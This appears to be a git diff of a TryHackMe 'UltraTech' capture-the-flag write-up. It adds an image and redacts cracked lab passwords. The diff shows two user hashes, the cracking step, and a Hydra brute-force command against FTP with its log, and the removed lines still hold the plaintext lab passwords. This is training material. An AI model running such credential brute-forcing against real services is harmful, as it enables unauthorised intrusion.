@@ -3,6 +3,7 @@ layout: post
 title:  "UltraTech"
 date:   2024-02-10 12:50:01 -0600
 categories: TryHackMe
+image: /assets/img/ultratech1.jpg
 ---
 [Ultratech](https://tryhackme.com/room/ultratech1)
 The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing
@@ -256,8 +257,8 @@ admin:0d0ea5111e3c1def594c1684e3b9be84
 r00t:f357a0c52799563c7c7b76c1e7543a32
 ```
 crackstation.net
-n100906
-mrsheafy
+{REDACTED}
+{REDACTED}
 
 ```
 root@ip-10-10-66-38:~# cat > ultratech.users << eof
@@ -266,8 +267,8 @@ root@ip-10-10-66-38:~# cat > ultratech.users << eof
 > eof
 
 root@ip-10-10-66-38:~# cat > ultratech.passwords << eof
-> n100906
-> mrsheafy
+> {REDACTED}
+> {REDACTED}
 > eof
 
 hydra -fV -L ultratech.users -P ultratech.passwords ftp://ultratech
@@ -277,11 +278,11 @@ Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret 
 Hydra (http://www.thc.org/thc-hydra) starting at 2024-02-11 18:04:42
 [DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task
 [DATA] attacking ftp://ultratech:21/
-[ATTEMPT] target ultratech - login "admin" - pass "n100906" - 1 of 4 [child 0] (0/0)
-[ATTEMPT] target ultratech - login "admin" - pass "mrsheafy" - 2 of 4 [child 1] (0/0)
-[ATTEMPT] target ultratech - login "r00t" - pass "n100906" - 3 of 4 [child 2] (0/0)
-[ATTEMPT] target ultratech - login "r00t" - pass "mrsheafy" - 4 of 4 [child 3] (0/0)
-[21][ftp] host: ultratech   login: r00t   password: n100906
+[ATTEMPT] target ultratech - login "admin" - pass "{REDACTED}" - 1 of 4 [child 0] (0/0)
+[ATTEMPT] target ultratech - login "admin" - pass "{REDACTED}" - 2 of 4 [child 1] (0/0)
+[ATTEMPT] target ultratech - login "r00t" - pass "{REDACTED}" - 3 of 4 [child 2] (0/0)
+[ATTEMPT] target ultratech - login "r00t" - pass "{REDACTED}" - 4 of 4 [child 3] (0/0)
+[21][ftp] host: ultratech   login: r00t   password: {REDACTED}
 [STATUS] attack finished for ultratech (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (http://www.thc.org/thc-hydra) finished at 2024-02-11 18:04:43
